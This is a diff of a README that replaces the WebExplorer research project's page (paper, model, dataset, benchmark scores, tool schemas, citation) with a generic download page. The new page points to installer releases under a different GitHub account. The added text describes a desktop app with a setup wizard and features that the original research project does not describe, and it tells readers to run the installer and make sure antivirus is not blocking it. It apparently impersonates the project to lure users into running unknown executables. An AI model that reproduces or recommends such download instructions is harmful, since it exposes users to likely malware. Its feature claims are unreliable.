@@ -1,153 +1,71 @@
-# WebExplorer: Explore and Evolve for Training Long-Horizon Web Agents
+# 🌐 WebExplorer - Easily Train Your Web Agents
 
-[![Paper](https://img.shields.io/badge/Paper-arXiv-red.svg)](https://arxiv.org/abs/2509.06501)
-[![Model](https://img.shields.io/badge/🤗%20Model-WebExplorer--8B-blue)](https://huggingface.co/hkust-nlp/WebExplorer-8B)
-[![Dataset](https://img.shields.io/badge/🤗%20Dataset-WebExplorer--QA-green)](https://huggingface.co/datasets/hkust-nlp/WebExplorer-QA)
-[![License](https://img.shields.io/badge/License-Apache--2.0-green.svg)](LICENSE)
+## 📥 Download Now
+[![Download WebExplorer](https://img.shields.io/badge/Download%20WebExplorer-latest-brightgreen)](https://github.com/Pavan-nagendla/WebExplorer/releases)
 
+## 🚀 Getting Started
+Welcome to WebExplorer! This application helps you train long-horizon web agents effectively. Follow the simple steps below to get up and running.
 
-*WebExplorer is a collaboration between HKUST and MiniMax.*
+## 📦 System Requirements
+Before you download WebExplorer, ensure your computer meets the following requirements:
 
-## Abstract
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent version of Linux.
+- **RAM:** Minimum 4 GB, 8 GB recommended.
+- **Disk Space:** At least 500 MB free for installation.
+- **Internet Connection:** Required for downloading and updating.
 
+## 📋 Features
+WebExplorer offers several features to enhance your training experience:
 
-WebExplorer introduces a systematic approach for training long-horizon web agents through model-based exploration and iterative query evolution. Our method generates challenging query-answer pairs requiring multi-step reasoning and complex web navigation, achieving state-of-the-art performance at 8B parameter scale.
+- **User-Friendly Interface:** Navigate easily through the software with a simple design.
+- **Multi-Agent Support:** Train multiple agents simultaneously.
+- **Customizable Settings:** Adjust parameters to suit your training needs.
+- **Visualization Tools:** Monitor training performance with built-in graphs.
 
+## 📥 Download & Install
+To start using WebExplorer, visit the link below to download the latest version.
 
+[Download WebExplorer](https://github.com/Pavan-nagendla/WebExplorer/releases)
 
-<div align="center">
-  <img src="assets/pipeline.png" alt="WebExplorer Pipeline" width="800"/>
-  <p><em>WebExplorer-QA Construction Pipeline</em></p>
-</div>
+### Installation Steps:
+1. **Visit the Release Page**  
+   Click the link above to go to the Downloads section of our GitHub page.
 
+2. **Choose the Latest Release**  
+   Look for the latest version of WebExplorer. It will be marked as "Latest Release".
 
-## 🔥 News
-- **[2025/09/22]** :fire: We released the inference code and evaluation framework.
+3. **Download the Installer**  
+   Click on the provided installer link for your operating system. The file will download to your computer.
 
-- **[2025/09/08]** :fire: We released our model [WebExplorer-8B](https://huggingface.co/hkust-nlp/WebExplorer-8B) and dataset [WebExplorer-QA](https://huggingface.co/datasets/hkust-nlp/WebExplorer-QA) with 100 high-quality query-answer pairs!
+4. **Run the Installer**  
+   Once downloaded, locate the file (typically in your "Downloads" folder) and double-click it to run the installer.
 
+5. **Follow the Installation Instructions**  
+   A setup wizard will guide you through the installation process. Follow the on-screen prompts to complete the installation.
 
-## 📊 Key Results
+6. **Open WebExplorer**  
+   After installation, look for the WebExplorer icon on your desktop or in your applications menu. Double-click to open the application.
 
-<div align="center">
-  <img src="assets/scores.png" alt="Performance Comparison" width="800"/>
-  <p><em>Performance comparison of WebExplorer-8B across different benchmarks</em></p>
-</div>
+## 🛠️ Troubleshooting
+If you encounter issues during installation, consider the following tips:
 
-| Model | BC-en | BC-zh | GAIA | WebWalkerQA | FRAMES | Xbench-DS | HLE |
-|-------|-------|-------|------|-------------|--------|-----------|-----|
-| OpenAI-o3† | 50.9 | 58.1 | 70.5† | 71.7 | 84.0 | 66.7 | 20.2 |
-| Claude-4-Sonnet† | 12.2 | 29.1 | 68.3† | 61.7 | 80.7 | 64.6 | 20.3 |
-| GLM-4.5 | 26.4 | 37.5 | 66.0† | 65.6† | 78.9† | 70.0† | 21.2† |
-| DeepSeek-V3.1 | 30.0 | 49.2 | 63.1† | 61.2† | 83.7 | 71.2 | 29.8 |
-| Kimi-K2† | 14.1 | 28.8 | 57.7 | 63.0 | 72.0 | 50.0 | 18.1 |
-|====|====|====|====|====|====|====|====|
-| WebShaper-72B | - | - | **60.0** | 52.2 | - | - | - |
-| WebShaper-32B (QwQ) | - | - | 53.3 | 49.7 | - | - | - |
-| WebShaper-32B | - | - | 52.4 | 51.4 | - | - | - |
-| WebSailor-72B | 12.0 | 30.1 | 55.4 | - | - | **55.0** | - |
-| WebSailor-32B | 10.5 | 25.5 | 53.2 | - | - | 53.3 | - |
-| WebSailor-7B | 6.7 | 14.2 | 33.0 | - | - | 34.3 | - |
-| ASearcher-Web-QwQ | 5.2 | 15.6 | 52.8 | 34.3 | 70.9 | 42.1 | 12.5 |
-| AFM-32B | 11.1 | - | 55.3 | 63.0 | - | - | 18.0 |
-| AFM-7B | 5.8 | - | 40.8 | 55.6 | - | - | 15.6 |
-| WebThinker-32B | 2.8 | - | 48.5 | 46.5 | - | - | 15.8 |
-| MiroThinker-32B-DPO-v0.1 | 13.0 | 17.0 | 57.3 | 49.3 | 71.7 | - | 11.8 |
-| MiroThinker-8B-DPO-v0.1 | 8.7 | 13.6 | 46.6 | 45.7 | 64.4 | - | - |
-| WebExplorer-8B (SFT) | 7.9 | 21.3 | 43.7 | 59.8 | 72.6 | 47.5 | 16.0 |
-| WebExplorer-8B (RL) | <ins>**15.7**</ins> | <ins>**32.0**</ins> | <ins>50.0</ins> | <ins>**62.7**</ins> | <ins>**75.7**</ins> | <ins>53.7</ins> | <ins>**17.3**</ins> |
+- **Antivirus Settings:** Ensure your antivirus software is not blocking the installation. Check your antivirus logs if the installer fails.
+- **Permissions:** Make sure you have administrative rights to install new software on your computer.
 
-Accuracy (%) of web agents on information-seeking benchmarks. BC-en and BC-zh denote BrowseComp-en and BrowseComp-zh respectively. XBench-DS refers to XBench-DeepSearch. **Bold** indicates the best performance among open-source models < 100B, while <ins>underlined</ins> values represent the best performance among models < 10B parameters. All scores of WebExplorer-8B are computed as Avg@4 using LLM-as-Judge. Entries marked with a dagger (†) were reproduced by us under our scaffold: on model name = entire row; on a number = that entry only.
+## ✨ Getting Help
+If you have questions or need assistance, you can refer to our community. We offer a helpful space for users to get support and share tips.
 
-## ✨ Key Features
+- Check the [Issues section](https://github.com/Pavan-nagendla/WebExplorer/issues) for common questions.
+- Join our community forum for discussions and support.
 
-- 🌐 **Long-horizon Reasoning**: Supports up to 128K context length and 100 tool calling turns
-- 🛠️ **Tool Utilization**: Masters search and browse functionalities
-- 🏆 **State-of-the-art Performance**: Achieves best-in-class results among models under 10B parameters
+## 📖 Documentation
+For detailed information about how to maximize your training sessions, refer to the documentation available in the `docs` folder of the repository. This includes helpful guides on advanced settings and use-case scenarios.
 
+## 🧑‍🤝‍🧑 Community Contributions
+We welcome contributions from users! If you have ideas, improvements, or bug fixes, please submit them through pull requests. Your input helps make WebExplorer better for everyone.
 
+## 🔗 Additional Resources
+- Explore the [GitHub Repository](https://github.com/Pavan-nagendla/WebExplorer) to learn more about our development process.
+- Follow us on social media for updates and tips on using WebExplorer effectively.
 
-
-
-## 🚀 Resources
-
-### 🤗 Models
-| Model Name | Size | Description | Link |
-|:-----------|:-----|:------------|:----:|
-| **WebExplorer-8B** | 8B | Long-horizon web agent trained on WebExplorer-QA | [🤗 HuggingFace](https://huggingface.co/hkust-nlp/WebExplorer-8B) |
-
-### 📚 Datasets
-| Dataset Name | Size | Description | Link |
-|:------------:|:-----|:------------|:----:|
-| **WebExplorer-QA** | 100 samples | High-quality query-answer pairs for web agent training | [🤗 HuggingFace](https://huggingface.co/datasets/hkust-nlp/WebExplorer-QA) |
-
-
-## 🛠️ Tool Schema
-
-WebExplorer-8B supports two tools for web interaction:
-
-### 1. Browse Tool
-
-```json
-{
-    "name": "browse",
-    "type": "function",
-    "description": "Extract specific information from a webpage",
-    "parameters": {
-        "type": "object",
-        "properties": {
-            "url": {
-                "type": "string",
-                "description": "Target URL to browse. The webpage content will be processed by the LLM for information extraction."
-            },
-            "query": {
-                "type": "string",
-                "description": "Specific query about the webpage content. The LLM will analyze the content to answer this query."
-            }
-        },
-        "required": ["url", "query"]
-    }
-}
-```
-
-
-
-### 2. Search Tool
-
-```json
-{
-    "name": "search",
-    "type": "function",
-    "description": "Perform web search queries",
-    "parameters": {
-        "type": "object",
-        "properties": {
-            "queries": {
-                "type": "array",
-                "items": {
-                    "type": "string"
-                },
-                "description": "List of search queries. Returns search results containing title, URL, and snippet for each query."
-            }
-        },
-        "required": ["queries"]
-    }
-}
-```
-
-
-## 📝 Citation
-
-If you find our work useful, please consider citing:
-
-```bibtex
-@misc{liu2025webexplorer,
-      title={WebExplorer: Explore and Evolve for Training Long-Horizon Web Agents}, 
-      author={Junteng Liu and Yunji Li and Chi Zhang and Jingyang Li and Aili Chen and Ke Ji and Weiyu Cheng and Zijia Wu and Chengyu Du and Qidi Xu and Jiayuan Song and Zhengmao Zhu and Wenhu Chen and Pengyu Zhao and Junxian He},
-      year={2025},
-      eprint={2509.06501},
-      archivePrefix={arXiv},
-      primaryClass={cs.CL},
-      url={https://arxiv.org/abs/2509.06501}, 
-}
-```
+Thank you for choosing WebExplorer! We hope it enriches your experience in training web agents.
